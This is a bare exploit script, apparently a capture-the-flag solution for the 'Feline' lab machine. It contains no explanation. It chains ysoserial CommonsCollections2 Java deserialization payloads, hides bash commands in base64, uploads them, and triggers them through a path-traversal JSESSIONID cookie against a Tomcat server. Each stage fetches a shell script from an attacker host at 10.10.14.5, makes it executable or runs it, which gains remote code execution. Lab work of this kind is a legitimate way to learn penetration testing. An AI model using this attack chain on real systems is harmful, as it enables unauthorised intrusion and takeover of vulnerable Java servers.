#jar file DOWNLOAD shell.sh: curl http://10.10.14.5:1339/shell.sh -o /tmp/shell.sh
java -jar ysoserial-master-6eca5bc740-1.jar CommonsCollections2 'bash -c {echo,Y3VybCBodHRwOi8vMTAuMTAuMTQuNToxMzM5L3NoZWxsLnNoIC1vIC90bXAvc2hlbGwuc2g=}|{base64,-d}|{bash,-i}' > pp0.session
curl 'http://feline.htb:8080/upload.jsp?email=aaaaaaaa' -F 'image=@pp0.session'
curl 'http://feline.htb:8080/upload.jsp' -H 'Cookie: JSESSIONID=../../../../../../../../opt/samples/uploads/pp0'

#jar file to execute: chmod +x /tmp/shell.sh
java -jar ysoserial-master-6eca5bc740-1.jar CommonsCollections2 'bash -c {echo,Y2htb2QgK3ggL3RtcC9zaGVsbC5zaA==}|{base64,-d}|{bash,-i}' > pp1.session
curl 'http://feline.htb:8080/upload.jsp?email=aaaaaaaa' -F 'image=@pp1.session'
curl 'http://feline.htb:8080/upload.jsp' -H 'Cookie: JSESSIONID=../../../../../../../../opt/samples/uploads/pp1'

#jar file to execute: bash -c /tmp/shell.sh
java -jar ysoserial-master-6eca5bc740-1.jar CommonsCollections2 'bash -c {echo,YmFzaCAtYyAvdG1wL3NoZWxsLnNo}|{base64,-d}|{bash,-i}' > pp2.session
curl 'http://feline.htb:8080/upload.jsp?email=aaaaaaaa' -F 'image=@pp2.session'
curl 'http://feline.htb:8080/upload.jsp' -H 'Cookie: JSESSIONID=../../../../../../../../opt/samples/uploads/pp2'

